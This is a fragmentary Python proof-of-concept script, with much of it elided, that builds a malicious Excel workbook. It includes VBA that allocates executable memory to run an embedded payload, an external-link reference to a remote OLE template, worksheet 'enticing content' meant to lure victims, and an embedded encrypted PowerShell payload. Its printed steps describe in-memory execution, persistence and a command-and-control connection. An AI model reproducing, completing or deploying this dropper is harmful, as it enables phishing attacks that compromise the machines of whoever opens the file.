...
def create_embedded_macro():
    ...
    # This would be the VBA code that extracts and executes the embedded payload
    vba_code = '''
...
Sub ExecuteInMemory(payload() As Byte)
    ...
    mem = VirtualAlloc(0, UBound(payload), &H1000, &H40)
...
def create_malicious_excel(output_file):
    ...
    with tempfile.TemporaryDirectory() as tmpdir:
        ...
        # Create the malicious OLE template reference
...
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    ...
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="../externalLinks/externalLink1.xml"/>
        ...
        # Create the malicious external link that will load our template
        external_link = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <externalBook name="\\\\127.0.0.1\\C$\\Windows\\Temp\\nightshade.ole" r:id="rId1"/>
</externalLink>'''
        ...
        # Create worksheet with enticing content
...
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
    <sheetData>
        ...
        # Encrypt and embed the PowerShell payload
...
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Excel.Macro.1" Version="1.0">
        ...
        # In a real attack, this would be served from a remote location
        # For this POC, we're including it as a reference
...
def main():
    ...
    try:
        ...
        print("    3. Template executes encrypted in-memory payload")
        print("    4. Payload establishes persistence and C2 connection")
        print("    5. Commands are executed entirely in memory")
